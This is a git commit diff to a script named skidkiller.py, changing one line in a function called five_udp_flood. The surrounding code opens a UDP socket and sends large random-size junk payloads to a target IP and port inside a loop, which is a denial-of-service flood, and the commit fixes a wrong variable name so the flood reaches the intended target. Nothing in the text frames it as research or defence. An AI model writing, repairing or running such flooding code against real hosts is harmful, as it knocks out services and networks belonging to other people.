2d47e8e4571517eaa25a0c8a6ea7e5d232dce223
KomaVR <komavr12454@gmail.com>
2026-07-23 14:29:13 -0700

    Update skidkiller.py

--- skidkiller.py
+++ skidkiller.py
@@ -142,7 +142,7 @@ def five_udp_flood(ip, port=5357):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             payload = b"A" * random.randint(1024, 65507)
-            sock.sendto(payload, (target_ip, port))
+            sock.sendto(payload, (ip, port))
             sock.close()
         except:
             pass
